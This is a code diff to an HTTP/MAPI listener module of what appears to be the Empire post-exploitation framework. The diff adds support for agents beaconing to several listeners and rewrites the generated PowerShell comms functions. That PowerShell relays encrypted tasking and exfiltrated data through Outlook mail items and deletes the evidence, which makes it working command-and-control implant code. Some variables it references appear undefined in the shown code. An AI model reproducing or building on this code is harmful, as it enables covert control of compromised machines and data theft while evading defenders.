@@ -122,7 +122,13 @@ class Listener:
                 'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                 'Required'      :   False,
                 'Value'         :   '#general'
+            },
+            'SupListeners': {
+                'Description'   :   'Names of the other Listeners the agent should beacon back to (eg: listener1,listener2,listener3)',
+                'Required'      :   False,
+                'Value'         :   ''
             }
+
         }
 
         # required:
@@ -358,18 +364,25 @@ class Listener:
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            commsCode = commsCode.replace('REPLACE_FOLDER',folder)
-            code = code.replace('REPLACE_COMMS', commsCode)
+            code = code.replace('#LISTENER_DICT', commsCode[0])\
+                   .replace('#COMM_FUNCTION', commsCode[1])\
+                   .replace('#TASK_FUNCTION',commsCode[2])
+
+            #Should we generate for more than one listener?
+            if self.options['SupListeners']['Value'] != '':
+                listeners = self.options['SupListeners']['Value'].split(',')
+                active_listeners = self.mainMenu.listeners.activeListeners
+                loaded_listeners = self.mainMenu.listeners.loadedListeners
+                #iterate through the listeners to retrieve options for each one and generate commCode
+                for l in listeners:
+                    loadedlistener = loaded_listeners[active_listeners[l]["moduleName"]]
+                    commsCode = loadedlistener.generate_comms(listenerOptions = active_listeners[l]['options'], language=language)
+                    code = code.replace('#LISTENER_DICT', commsCode[0])\
+                           .replace('#COMM_FUNCTION', commsCode[1])\
+                           .replace('#TASK_FUNCTION',commsCode[2])
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
-
-            # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
-            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
-            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
@@ -380,15 +393,49 @@ class Listener:
             print helpers.color("[!] listeners/http_mapi generate_agent(): invalid language specification, only 'powershell' is currently supported for this module.")
 
 
-    def generate_comms(self, listenerOptions, language=None):
+    def generate_comms(self, listenerOptions, language=None,**kwargs):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
         This is so agents can easily be dynamically updated for the new listener.
         """
 
+        #we are generating code for an already deployed agent
+        deployed = "deployed" in kwargs
+
         if language:
             if language.lower() == 'powershell':
+                listener_dict = """
+@{{
+    delay = {delay}
+    name = "{name}"
+    jitter = {jitter}
+    profile= "{profile}"
+    fixed_parameters= @{{
+        headers = @{{UserAgent= "{UA}"
+                     Cookie="{cookie}"}}
+        taskURIs = "{taskURIs}"
+        }}
+    send_func= $script:{send_func}
+    get_task_func= $script:{get_task_func}
+    lostLimit= {lostLimit}
+    missedCheckins={missedCheckins}
+    defaultResponse=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{defaultResponse}"))
+}} 
+#LISTENER_DICT
+""".format(
+           get_task_func = "GetTask{}".format(listenerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           lostLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'],
+           cookie = self.options['Cookie']['Value'],
+           taskURIs = profile.split('|')[0])
 
                 updateServers = """
                     $Script:ControlServers = @("%s");
@@ -396,14 +443,18 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    $script:GetTask = {
-                        try {
+                    $script:GetTask{name} = {{
+                        try {{
+                                param($FixedParameters)
+                                $ControlServers = {ControlServers};
+                                $ServerIndex = 0;
+
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random;
+                                $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
 
                                 $mail = $"""+helpers.generate_random_script_var_name("GPF")+""".CreateItem(0);
                                 $mail.Subject = "mailpireout";
@@ -415,35 +466,37 @@ class Listener:
                                 $break = $False;
                                 [byte[]]$b = @();
 
-                                While ($break -ne $True){
-                                  foreach ($item in $fld.Items) {
-                                    if($item.Subject -eq "mailpirein"){
+                                While ($break -ne $True){{
+                                  foreach ($item in $fld.Items) {{
+                                    if($item.Subject -eq "mailpirein"){{
                                       $item.HTMLBody | out-null;
-                                      if($item.Body[$item.Body.Length-1] -ne '-'){
+                                      if($item.Body[$item.Body.Length-1] -ne '-'){{
                                         $traw = $item.Body;
                                         $item.Delete();
                                         $break = $True;
                                         $b = [System.Convert]::FromBase64String($traw);
-                                      }
-                                    }
-                                  }
+                                      }}
+                                    }}
+                                  }}
                                   Start-Sleep -s 1;
-                                }
+                                }}
                                 return ,$b
+                        }}
+                        catch {{
 
-                        }
-                        catch {
-
-                        }
-                        while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};}
-                    }
+                        }}
+                        while(($fldel.Items | measure | %{{$_.Count}}) -gt 0 ){{ $fldel.Items | %{{$_.delete()}};}}
+                    }}
+                #TASK_FUNCTION
                 """
 
                 sendMessage = """
-                    $script:SendMessage = {
-                        param($Packets)
+                    $script:SendMessage{name} = {{
+                        param($Packets,$FixedParameters)
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
 
-                        if($Packets) {
+                        if($Packets) {{
                             # build and encrypt the response packet
                             $EncBytes = Encrypt-Bytes $Packets;
                             # build the top level RC4 "routing packet"
@@ -452,7 +505,7 @@ class Listener:
 
                             # $RoutingPacketp = [System.BitConverter]::ToString($RoutingPacket);
                             $RoutingPacketp = [Convert]::ToBase64String($RoutingPacket)
-                            try {
+                            try {{
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random;
                                     $mail = $"""+helpers.generate_random_script_var_name("GPF")+""".CreateItem(0);
@@ -460,14 +513,24 @@ class Listener:
                                     $mail.Body = "POSTM - "+$taskURI +" - "+$RoutingPacketp;
                                     $mail.save() | out-null;
                                     $mail.Move($fld) | out-null;
-                                }
-                                catch {
-                                }
-                                while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};}
-                        }
-                    }
+                                }}
+                                catch {{
+                                }}
+                                while(($fldel.Items | measure | %{{$_.Count}}) -gt 0 ){{ $fldel.Items | %{{$_.delete()}};}}
+                        }}
+                    }}
+                #COMM_FUNCTION
                 """
-                return updateServers + getTask + sendMessage
+                if deployed:
+                    return ( "$script:NewListenerDict = {};".format(listener_dict) +
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']) +
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+                else:
+                    return (listener_dict,
+                            getTask.format(ControlServers = updateServers,
+                                           name = listenerOptions['Name']['Value'],
+                                           reqheader = listenerOptions['RequestHeader']['Value']),
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             else:
                 print helpers.color("[!] listeners/http_mapi generate_comms(): invalid language specification, only 'powershell' is currently supported for this module.")
